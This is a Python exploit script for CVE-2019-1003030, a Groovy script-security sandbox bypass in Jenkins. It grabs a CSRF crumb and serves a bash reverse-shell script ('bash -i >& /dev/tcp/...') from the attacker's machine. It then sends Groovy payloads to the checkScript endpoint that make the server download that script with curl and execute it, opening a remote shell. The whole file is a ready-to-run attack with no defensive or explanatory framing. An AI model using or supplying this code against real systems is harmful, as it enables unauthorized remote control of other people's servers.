# Exploit Author: ghrez1ns
# Version: 1.0
# Tested on: Jenkins 2.63 - Ubuntu 22.04.2 LTS
# CVE: 2019-1003030

import requests
import urllib.parse
import threading
from http.server import SimpleHTTPRequestHandler, HTTPServer
import argparse

class Colors:
    RESET = '\033[0m'
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTE = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class MyHandler(SimpleHTTPRequestHandler):
    pass

def gen_revshell():
    with open("revshell.sh", 'w') as file:
        file.write(f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1")

def get_crumb():
    print(Colors.BLUE + "[*] geting crumb" + Colors.RESET)

    endpoint = "crumbIssuer/api/json"
    response = requests.get(f"http://{RHOST}:{RPORT}/{endpoint}")

    statusCode = response.status_code

    if statusCode == 200:
        json = response.json()
        crumb = json['crumb']

        print(Colors.GREEN + f"[+] crumb: {crumb}" + Colors.RESET)
        return crumb
    else:
        print(Colors.RED + "[!] error geting crumb" + Colors.RESET)

def start_srv():
    srvaddress = (LHOST, SRVPORT)
    httpd = HTTPServer(srvaddress, MyHandler)
    httpd.serve_forever()

def send_revshell(RHOST, RPORT, SRVPORT, crumb):
    print(Colors.BLUE + "[*] starting http server" + Colors.RESET)
    httpThread = threading.Thread(target=start_srv)
    httpThread.daemon = True
    httpThread.start()
    print(Colors.GREEN + f"[+] http://{LHOST}:{SRVPORT}/" + Colors.RESET)
    print(Colors.BLUE + "[*] sending revshell" + Colors.RESET)
    srvhttp = f"http://{LHOST}:{SRVPORT}"
    payload = urllib.parse.quote_plus('public class x { public x(){ "curl -o /tmp/revshell.sh ' + srvhttp + '/revshell.sh".execute() }}')

    header = {"Jenkins-Crumb": crumb}
    url = f"http://{RHOST}:{RPORT}/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value={payload}"

    response = requests.post(url=url, headers=header)
    statusCode = response.status_code

    if statusCode == 200:
        print(Colors.GREEN + "[+] revshell sent" + Colors.RESET)
        exec_revshell(RHOST, RPORT, crumb)
    else:
        print(Colors.RED + "[!] error sending payload" + Colors.RESET)

def exec_revshell(RHOST, RPORT, crumb):
    print(Colors.BLUE + "[*] executing revshell" + Colors.RESET)

    payload = urllib.parse.quote_plus('public class x { public x(){ "/bin/bash /tmp/revshell.sh".execute() }}')

    header = {"Jenkins-Crumb": crumb}
    url = f"http://{RHOST}:{RPORT}/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value={payload}"

    response = requests.post(url=url, headers=header)
    statusCode = response.status_code

    if statusCode == 200:
        print(Colors.GREEN + "[+] revshell executed" + Colors.RESET)
        print(Colors.YELLOW + "[$] look at your terminal with the listener" + Colors.RESET)
    else:
        print(Colors.RED + "[!] error when executing revshell" + Colors.RESET)

if __name__ == "__main__":
    print(Colors.CYAN + """  _____ _   __ ____      ___  ___  ___ ___       ___ ___   ___   ____ ___   ____ ___ 
 / ___/| | / // __/____ |_  |/ _ \<  // _ \ ____<  // _ \ / _ \ |_  // _ \ |_  // _ \\
/ /__  | |/ // _/ /___// __// // // / \_, //___// // // // // /_/_ </ // /_/_ </ // /
\___/  |___//___/     /____/\___//_/ /___/     /_/ \___/ \___//____/\___//____/\___/ 

                                                                       by: ghrez1ns
          """ + Colors.RESET)
    parser = argparse.ArgumentParser(description='Exploit developed to exploit CVE-2019-1003030 and achieve a reverse shell')
    parser.add_argument('-rh', '--rhost', metavar='RHOST', type=str, required=True, help='IP Address for remote host.')
    parser.add_argument('-rp', '--rport', metavar='RPORT', type=int, required=True, help='Port number for remote host.')
    parser.add_argument('-lh', '--lhost', metavar='LHOST', type=str, required=True, help='IP Address for local host.')
    parser.add_argument('-lp', '--lport', metavar='LPORT', type=int, required=True, help='Port number for local host.')
    parser.add_argument('-sr', '--srvport', metavar='SRVPORT', type=int, required=True, help='Port number for local server.')
    args = parser.parse_args()
    RHOST = args.rhost
    RPORT = args.rport
    LHOST = args.lhost
    LPORT = args.lport
    SRVPORT = args.srvport
    if RHOST and RPORT and LHOST and LPORT and SRVPORT:
        gen_revshell()
        crumb = get_crumb()
        send_revshell(RHOST, RPORT, SRVPORT, crumb)
